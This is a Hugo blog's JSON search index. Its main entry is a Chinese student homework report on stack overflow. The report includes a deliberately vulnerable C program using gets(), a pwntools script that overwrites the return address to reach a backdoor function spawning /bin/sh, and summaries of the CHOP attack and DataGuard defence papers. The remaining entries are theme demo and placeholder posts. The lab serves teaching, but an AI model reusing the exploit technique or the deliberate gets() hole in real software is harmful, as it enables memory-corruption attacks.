[{"content":"1.栈溢出攻击实践 1.1 实验环境 操作系统：虚拟机 Ubuntu 16.04 LTS 编译器：gcc 9.3.0 攻击工具：python 3.8 | pwntools | IDA Pro 8.5 1.2 实验步骤 1.2.1 编写漏洞程序 1 2 3 4 5 6 7 8 9 10 11 12 13 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void backdoor() { // 自定义的函数 system(\u0026#34;/bin/sh\u0026#34;); // 后门函数执行shell } int main() { puts(\u0026#34;网络攻击检测作业3_梁铭杰\u0026#34;); char buffer[64]; // 一个缓冲区 gets(buffer); // 不安全的输入函数导致栈溢出 return 0; } gets函数为不安全的输入函数，当输入的字符数超过缓冲区大小时，会发生栈溢出。\n而backdoor函数为后门函数，当程序执行到该函数时，会执行system(\u0026quot;/bin/sh\u0026quot;)，即执行/bin/sh命令，从而获得shell。\n按照程序正常执行流程，并不会执行backdoor函数，接下来将进行漏洞利用。\n1.2.2 编译漏洞程序 为尽可能保证仅仅关注栈溢出攻击以及作业要求（使用栈溢出跳转到自定义函数） 在编译时关闭Canary金丝雀和ASLR地址随机化 gcc vuln.c -fno-stack-protector -no-pie -o vuln\n1.2.2 IDA分析漏洞程序 将程序移进IDA进行反编译分析 IDA给出所有函数的地址以及反编译内容 再进入main函数的v4变量，即源代码中buffer变量缓冲区 可见需要输入0x40(buffer变量设定长度)+0x8(栈帧rbp)=0x48才能到达返回地址 关注重点\nbackdoor函数地址为0x0000000004005B6 覆盖长度0x48,而往后的0x8用来覆盖地址 攻击思路\n在v4变量中输入0x48个字符后，再输入0x8个字节即可覆盖返回地址 将返回地址设置为backdoor函数地址，达成利用 1.2.3 编写攻击程序 1 2 3 4 5 6 7 8 9 from pwn import * # 导入pwntools context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) # 日志环境 backdoor = 0x0000000004005B6 p=process(\u0026#34;./vuln\u0026#34;) # 进程 p.recvuntil(\u0026#34;\\n\u0026#34;) # 接收输入 pl = b\u0026#39;a\u0026#39;*0x48 # 输入0x48个字符 pl += p64(backdoor) # 覆盖返回地址 p.sendline(pl) # 发送 p.interactive() # 回归用户与进程的交互 1.2.4 攻击 1.2.4.1 攻击效果 在脚本与程序交互后，程序成功执行backdoor函数，获得shell 回归用户与进程的交互后，输入whoami，可以显示当前用户名，与直接使用终端的用户相同 攻击利用达成\n1.2.4.2 攻击过程 此处交由GDB调试来具体展示过程 由于需要完成栈溢出攻击并跳转到自定义函数，因此是需要控制程序执行流 在此处只能够在main函数结束时完成攻击 因此在main函数的retn返回处下断点 正常程序 正常程序下，程序执行到retn处，返回到调用main函数的地址(__libc_start_main+176)，即程序结束\n攻击程序 攻击程序下，程序执行到retn处，返回到backdoor函数，获取shell后，该程序运行结束\n2.栈溢出攻击与防御的文献阅读 2.1 攻击类文献（PPT中汇报的） Let Me Unwind That For You: Exceptions to Backward-Edge Protection（让我为你解开：后沿保护的例外） 2.1.1 问题背景 传统的堆栈缓冲区溢出攻击（尤其是利用返回地址篡改实现的后向控制流劫持）长期以来一直是软件攻击的一个关键点。为了防范这类攻击，学术界和工业界提出了多种后向保护机制，例如栈保护(canaries)和影子栈(shadow stacks)。这些防护措施的基本假设是：攻击者必须直接篡改返回地址才能劫持控制流，从而可以通过检测返回时的数据完整性来防御攻击。\n2.1.2 动机 论文作者注意到，尽管这些防护机制在传统场景下非常有效，但它们普遍依赖一个关键假设：即攻击者必须通过直接控制返回地址来实现攻击。然而，论文指出，攻击者并不一定需要直接劫持返回地址，而可以利用异常处理机制在堆栈展开过程中实现控制流劫持。这种方法绕过了传统后向保护机制，从而开启了一种新的攻击范式。\n2.1.3 论文方案设计 论文提出了一种名为 Catch Handler Oriented Programming (CHOP) 的新型攻击技术，其核心思想在于利用常规后向保护机制未覆盖的异常处理进行堆栈展开，进而可进行传统的ROP攻击。 当程序触发异常时，运行时系统会走异常处理的流程（即“堆栈展开”），其过程中会依据堆栈上的元数据找到合适的异常处理程序（catch handler）或清理代码(cleanup handler)。如果攻击者能够利用堆栈溢出漏洞破坏堆栈数据，那么在异常处理过程中，运行时系统会按照攻击者构造的数据进行堆栈展开，进而“误导”异常处理逻辑跳转到攻击者控制的处理程序。 论文提出的 CHOP 攻击正是基于此原理展开，其核心在于定义并利用“混淆原语”（Confusion Primitives），即通过破坏特定堆栈数据结构，让异常展开逻辑误将攻击者构造的数据当作合法跳转目标或状态恢复信息。通过这种方式，攻击者可在异常处理过程中构造出多个具备关键功能的“gadget”，类似于传统 ROP（Return-Oriented Programming）攻击中所用的代码片段。作者通过对大量文件进行分析，发现这些 gadget 在现实世界中非常普遍，尤其是在使用 C++ 异常机制的程序中，异常处理器常常含有内存读写、控制流转移等指令，极易被利用构建攻击链。\n2.1.4 实验： 文章对多个平台（包括 Linux、macOS、Windows、Android 和 iOS）进行了跨体系结构的测试，基于 Debian Buster 发行版中的上千个流行程序包展开大规模分析。实验表明，约 10% 的程序包含可被利用的异常处理逻辑，并在其中识别出了数量庞大的潜在 CHOP gadget。另外，作者还用CVE-2009-4009和SCSSU-201801来举例通过CHOP构造的攻击样本可以在实际系统中实现任意内存写、控制流劫持及数据泄漏等复杂攻击。\n2.1.5 防御措施与改进建议： 在短期缓解上，论文建议在堆栈展开（异常处理）过程中扩展栈 canary 检查，从而在异常抛出时检测堆栈数据是否被修改。可以考虑对异常处理元数据进行完整性校验或者采用与异常处理紧密耦合的安全机制（例如在 shadow stack 实现上修改堆栈展开逻辑，使其依赖于更安全的备份数据）。 而对于较彻底的防御，论文建议在编译器和运行时系统中，对异常处理（包括 try/catch 块内及其清理代码）进行更严格的安全性检查，从根本上防止攻击者利用异常处理流程进行控制流劫持，或是采用先进的防护策略（如函数随机化、细粒度随机化）来降低攻击者预测异常处理代码地址的能力。\n2.1.6 总结和展望： 全文通过对传统后向保护机制局限性的深刻分析，展示了攻击者如何利用异常处理中的堆栈展开流程来实现控制流劫持，即 CHOP 攻击。此方法绕过了目前广泛采用的防护措施（如金丝雀和影子栈），而且在多个平台上均能成功实施，具有很强的现实威胁。未来的研究可能会进一步探讨更加完善的异常处理安全机制，以及如何在不影响性能的前提下集成更多安全检查，以防止类似 CHOP 这样的新型攻击方式。\n2.2 防御类文献 The Taming of the Stack: Isolating Stack Data from Memory Errors堆栈驯服：将堆栈数据与内存错误隔离 2.2.1 问题背景 传统的堆栈防护（例如使用金丝雀、影子栈以及安全栈机制）主要关注于防止对代码指针的修改，从而阻断传统的缓冲区溢出攻击，即侧重于保护返回地址等关键代码指针。然而，随着攻击技术的演进，攻击者不仅针对返回地址，还可能利用空间错误（buffer overflow/underflow）、类型错误（type confusion）和时间错误（temporal errors，如使用未初始化或已释放的指针）来修改堆栈中其他敏感数据或窃取信息。这些额外的内存错误如果得不到防护，仍然会给系统带来风险。\n2.2.2 动机 现有的安全机制在设计上过于保守，将大量对象归类为“不安全”，从而不得不牺牲较多不必要的操作以对这些对象进行保护；同时，部分防御仅仅能保护返回地址，而无法全面防护堆栈上的所有数据对象。论文的目标在于如何能够更精确地验证哪些堆栈对象真正安全，从而将这些对象隔离到“安全堆栈”中，以阻断各种内存错误的利用，同时降低运行时开销。\n2.2.3 论文方案设计 论文提出了DATAGUARD系统，作为一种新的堆栈防护方案，其核心思路是通过静态分析和约束符号执行相结合的方法，对每个堆栈对象进行安全性验证。 论文在安全性定义方面做出了扩展，不再局限于仅保护代码指针，而是要求所有被保护的堆栈对象必须在所有可能的执行路径上满足严格的安全约束。具体来说，一个堆栈对象要被认定为安全，必须确保所有可能引用该对象的指针在空间上访问都严格位于该对象的边界内，在类型转换上不会发生数值或语义上的改变，并且在使用时始终处于合法的生命周期之内。为此，作者设计了一套验证机制，既包括静态分析，也引入了符号执行技术。通过静态分析，系统可以初步对堆栈对象的定义、引用和使用情况进行推导，生成与空间、类型和时间安全相关的约束；而针对那些因过于保守而不能直接证明安全的对象，则借助符号执行进一步验证其在所有可能路径上是否满足安全条件，防止静态阶段错误的安全分类。 DATAGUARD利用LLVM平台上的中间表示（SSA形式）结合现有的程序依赖图（PDG）和SVF工具进行指针别名和活跃区间分析，并通过S2E框架对部分难以断定的情况采用有针对性的符号执行。只有那些在所有可能情况中均无安全隐患的堆栈对象，才能被归入安全类别，并最终移入与常规堆栈隔离的安全堆栈中，以完全依赖编译期生成的运行时保护机制提供高效的安全防护。\n2.2.4 实验评估 论文在多个服务器程序（如nginx、httpd、openvpn等）以及SPEC CPU2006基准测试上进行了评估。结果显示，DATAGUARD能够将更多原本被传统Safe Stack方法判定为不安全的堆栈对象判定为安全，从而在扩展堆栈保护范围的同时，还能降低运行时防护的性能开销。例如，在SPEC CPU006基准测试中，通过DATAGUARD方式保护堆栈对象所增加的性能开销平均由11.3%降低到4.3%。\n2.2.5 总结和展望 论文基于隔离栈的技术，参考OSDI'14上的一篇工作《Code-pointer integrity》，在保证代码指针的完整性基础上，通过建立更严格的安全定义，将堆栈对象的保护范围从单一的返回地址扩展到所有堆栈数据。另外通过静态分析与符号执行相结合的验证方法，确保只有在所有可能的执行情形下均满足严格安全约束的对象才被归入安全堆栈，从而在不牺牲安全性的前提下显著降低运行时检测的开销。该工作为内存错误防护提供了新的视角，不仅提高了堆栈数据的保护力度，而且为相关防御措施的改进指明了方向。\n3. 个人心得体会 在准备此次作业的过程中，从实际操作和文献上了解到了栈溢出攻击和防御。在文献的阅读上，检索到了较多的相关文献，除了上述两篇以外，还涉及到许多顶会的论文文献（PPT中讲述），切身感受到当前研究趋势的多样化与日益精细化。 传统的缓冲区溢出攻击主要集中在利用简单的内存溢出和代码注入技术，攻击者通过构造特定的数据溢出，突破系统的基本防护措施，实现任意代码执行。面对这些攻击，最初的防御手段也相对单一，主要依赖操作系统级的内存保护和简单的补丁修复。尽管这些措施在一定程度上限制了攻击者的手段，但仍无法彻底消除漏洞。 随着攻击技术的不断发展，攻击者不再满足于简单的利用方式，而是开始运用更复杂的技术，如利用各类攻击链（如上述的CHOP）、动态生成ROP链条以及针对特定平台（例如物联网和专用硬件平台）的新型攻击手法。这种多样化的攻击方式使得传统的防护手段逐渐显示出局限性，需要从根本上升级防御策略。 在防御领域，研究者逐步从单纯的软件补救措施转向硬件与软件相结合的综合防护机制。硬件层面的防御方法，如利用硬件控制流保护与指针认证机制，显著降低了攻击成功率；同时，控制流完整性检查和编译器辅助的防御技术不断完善，通过在代码编译和运行时对潜在的利用点进行分析与约束，进一步提高了系统的整体安全性。这种多层次的防护体系有效平衡了性能和安全性，构成了应对新型攻击挑战的重要屏障。 这次的作业备使我充分认识到，栈溢出的攻击和防御对抗发展迅速。攻击手法从传统的单一模式逐步演变为更复杂、更自动化的多平台利用，而防御技术也在不断从单点防护向系统级综合防御转变。\n","date":"2025-04-18T14:14:02+08:00","image":"https://i-corner.github.io/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-7_hu_b221ddbdf37ee118.png","permalink":"https://i-corner.github.io/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/","title":"栈溢出攻击"},{"content":"正文测试 而这些并不是完全重要，更加重要的问题是， 带着这些问题，我们来审视一下学生会退会。 既然如何， 对我个人而言，学生会退会不仅仅是一个重大的事件，还可能会改变我的人生。 我们不得不面对一个非常尴尬的事实，那就是， 可是，即使是这样，学生会退会的出现仍然代表了一定的意义。 学生会退会，发生了会如何，不发生又会如何。 经过上述讨论， 生活中，若学生会退会出现了，我们就不得不考虑它出现了的事实。 学生会退会，到底应该如何实现。 这样看来， 在这种困难的抉择下，本人思来想去，寝食难安。 对我个人而言，学生会退会不仅仅是一个重大的事件，还可能会改变我的人生。 就我个人来说，学生会退会对我的意义，不能不说非常重大。 莎士比亚曾经提到过，人的一生是短的，但如果卑劣地过这一生，就太长了。这似乎解答了我的疑惑。 莫扎特说过一句富有哲理的话，谁和我一样用功，谁就会和我一样成功。这启发了我， 对我个人而言，学生会退会不仅仅是一个重大的事件，还可能会改变我的人生。 学生会退会，到底应该如何实现。 一般来说， 从这个角度来看， 这种事实对本人来说意义重大，相信对这个世界也是有一定意义的。 在这种困难的抉择下，本人思来想去，寝食难安。 了解清楚学生会退会到底是一种怎么样的存在，是解决一切问题的关键。 一般来说， 生活中，若学生会退会出现了，我们就不得不考虑它出现了的事实。 问题的关键究竟为何？ 而这些并不是完全重要，更加重要的问题是。\n奥斯特洛夫斯基曾经说过，共同的事业，共同的斗争，可以使人们产生忍受一切的力量。　带着这句话，我们还要更加慎重的审视这个问题： 一般来讲，我们都必须务必慎重的考虑考虑。 既然如此， 这种事实对本人来说意义重大，相信对这个世界也是有一定意义的。 带着这些问题，我们来审视一下学生会退会。 我认为， 我认为， 在这种困难的抉择下，本人思来想去，寝食难安。 问题的关键究竟为何？ 每个人都不得不面对这些问题。 在面对这种问题时， 要想清楚，学生会退会，到底是一种怎么样的存在。 我认为， 既然如此， 每个人都不得不面对这些问题。 在面对这种问题时， 那么， 我认为， 学生会退会因何而发生。\n引用 思念是最暖的忧伤像一双翅膀\n让我停不了飞不远在过往游荡\n不告而别的你 就算为了我着想\n这么沉痛的呵护 我怎么能翱翔\n最暖的憂傷 - 田馥甄\n图片 1 2 3 ![Photo by Florian Klauer on Unsplash](florian-klauer-nptLmg6jqDo-unsplash.jpg) ![Photo by Luca Bravo on Unsplash](luca-bravo-alS7ewQ41M8-unsplash.jpg) ![Photo by Helena Hertz on Unsplash](helena-hertz-wWZzXlDpMog-unsplash.jpg) ![Photo by Hudai Gayiran on Unsplash](hudai-gayiran-3Od_VKcDEAA-unsplash.jpg) 相册语法来自 Typlog\n","date":"2020-09-09T00:00:00Z","image":"https://i-corner.github.io/p/test-chinese/helena-hertz-wWZzXlDpMog-unsplash_hu_2307260c751d0e0b.jpg","permalink":"https://i-corner.github.io/p/test-chinese/","title":"Chinese Test"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution Tiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\nBlockquote with attribution Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\n— Rob Pike1\nTables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables Italics Bold Code italics bold code A B C D E F Lorem ipsum dolor sit amet, consectetur adipiscing elit. Phasellus ultricies, sapien non euismod aliquam, dui ligula tincidunt odio, at accumsan nulla sapien eget ex. Proin eleifend dictum ipsum, non euismod ipsum pulvinar et. Vivamus sollicitudin, quam in pulvinar aliquam, metus elit pretium purus Proin sit amet velit nec enim imperdiet vehicula. Ut bibendum vestibulum quam, eu egestas turpis gravida nec Sed scelerisque nec turpis vel viverra. Vivamus vitae pretium sapien Code Blocks Code block with backticks 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block with Hugo\u0026rsquo;s internal highlight shortcode 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Diff code block 1 2 3 4 5 [dependencies.bevy] git = \u0026#34;https://github.com/bevyengine/bevy\u0026#34; rev = \u0026#34;11f52b8c72fc3a568e8bb4a4cd1f3eb025ac2e13\u0026#34; - features = [\u0026#34;dynamic\u0026#34;] + features = [\u0026#34;jpeg\u0026#34;, \u0026#34;dynamic\u0026#34;] List Types Ordered List First item Second item Third item Unordered List List item Another item And another item Nested list Fruit Apple Orange Banana Dairy Milk Cheese Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL + ALT + Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\nHyperlinked image The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2019-03-11T00:00:00Z","image":"https://i-corner.github.io/p/markdown-syntax-guide/pawel-czerwinski-8uZPynIu-rQ-unsplash_hu_e95a4276bf860a84.jpg","permalink":"https://i-corner.github.io/p/markdown-syntax-guide/","title":"Markdown Syntax Guide"},{"content":"Hugo ships with several Built-in Shortcodes for rich content, along with a Privacy Config and a set of Simple Shortcodes that enable static and no-JS versions of various social media embeds.\nYouTube Privacy Enhanced Shortcode Twitter Simple Shortcode “In addition to being more logical, asymmetry has the advantage that its complete appearance is far more optically effective than symmetry.”\n— Jan Tschichold pic.twitter.com/gcv7SrhvJb\n\u0026mdash; Design Reviewed | Graphic Design History (@DesignReviewed) January 17, 2019 Vimeo Simple Shortcode bilibilibi Shortcode Gist Shortcode Gitlab Snippets Shortcode Quote Shortcode Stack adds a quote shortcode. For example:\nLorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.\n― A famous person, The book they wrote Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.\n― Anonymous book Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.\n― Some book Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.\n― Somebody","date":"2019-03-10T00:00:00Z","permalink":"https://i-corner.github.io/p/rich-content/","title":"Rich Content"},{"content":"Lorem est tota propiore conpellat pectoribus de pectora summo.\nRedit teque digerit hominumque toris verebor lumina non cervice subde tollit usus habet Arctonque, furores quas nec ferunt. Quoque montibus nunc caluere tempus inhospita parcite confusaque translucet patri vestro qui optatis lumine cognoscere flos nubis! Fronde ipsamque patulos Dryopen deorum.\nExierant elisi ambit vivere dedere Duce pollice Eris modo Spargitque ferrea quos palude Rursus nulli murmur; hastile inridet ut ab gravi sententia! Nomine potitus silentia flumen, sustinet placuit petis in dilapsa erat sunt. Atria tractus malis.\nComas hunc haec pietate fetum procerum dixit Post torum vates letum Tiresia Flumen querellas Arcanaque montibus omnes Quidem et Vagus elidunt The Van de Graaf Canon\nMane refeci capiebant unda mulcebat Victa caducifer, malo vulnere contra dicere aurato, ludit regale, voca! Retorsit colit est profanae esse virescere furit nec; iaculi matertera et visa est, viribus. Divesque creatis, tecta novat collumque vulnus est, parvas. Faces illo pepulere tempus adest. Tendit flamma, ab opes virum sustinet, sidus sequendo urbis.\nIubar proles corpore raptos vero auctor imperium; sed et huic: manus caeli Lelegas tu lux. Verbis obstitit intus oblectamina fixis linguisque ausus sperare Echionides cornuaque tenent clausit possit. Omnia putatur. Praeteritae refert ausus; ferebant e primus lora nutat, vici quae mea ipse. Et iter nil spectatae vulnus haerentia iuste et exercebat, sui et.\nEurytus Hector, materna ipsumque ut Politen, nec, nate, ignari, vernum cohaesit sequitur. Vel mitis temploque vocatus, inque alis, oculos nomen non silvis corpore coniunx ne displicet illa. Crescunt non unus, vidit visa quantum inmiti flumina mortis facto sic: undique a alios vincula sunt iactata abdita! Suspenderat ego fuit tendit: luna, ante urbem Propoetides parte.\n","date":"2019-03-09T00:00:00Z","image":"https://i-corner.github.io/p/placeholder-text/matt-le-SJSpo9hQf7s-unsplash_hu_c1ca39d792aee4ab.jpg","permalink":"https://i-corner.github.io/p/placeholder-text/","title":"Placeholder Text"},{"content":"Mathematical notation in a Hugo project can be enabled by using third party JavaScript libraries.\nIn this example we will be using KaTeX\nCreate a partial under /layouts/partials/math.html Within this partial reference the Auto-render Extension or host these scripts locally. Include the partial in your templates like so: 1 2 3 {{ if or .Params.math .Site.Params.math }} {{ partial \u0026#34;math.html\u0026#34; . }} {{ end }} To enable KaTeX globally set the parameter math to true in a project\u0026rsquo;s configuration To enable KaTeX on a per page basis include the parameter math: true in content files Note: Use the online reference of Supported TeX Functions\nExamples Inline math: $\\varphi = \\dfrac{1+\\sqrt5}{2}= 1.6180339887…$\nBlock math: $$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$","date":"2019-03-08T00:00:00Z","permalink":"https://i-corner.github.io/p/math-typesetting/","title":"Math Typesetting"},{"content":"Emoji can be enabled in a Hugo project in a number of ways.\nThe emojify function can be called directly in templates or Inline Shortcodes.\nTo enable emoji globally, set enableEmoji to true in your site\u0026rsquo;s configuration and then you can type emoji shorthand codes directly in content files; e.g.\n🙈 :see_no_evil: 🙉 :hear_no_evil: 🙊 :speak_no_evil:\nThe Emoji cheat sheet is a useful reference for emoji shorthand codes.\nN.B. The above steps enable Unicode Standard emoji characters and sequences in Hugo, however the rendering of these glyphs depends on the browser and the platform. To style the emoji you can either use a third party emoji font or a font stack; e.g.\n1 2 3 .emoji { font-family: Apple Color Emoji, Segoe UI Emoji, NotoColorEmoji, Segoe UI Symbol, Android Emoji, EmojiSymbols; } ","date":"2019-03-05T00:00:00Z","image":"https://i-corner.github.io/p/emoji-support/the-creative-exchange-d2zvqp3fpro-unsplash_hu_27b8954607cdb515.jpg","permalink":"https://i-corner.github.io/p/emoji-support/","title":"Emoji Support"}]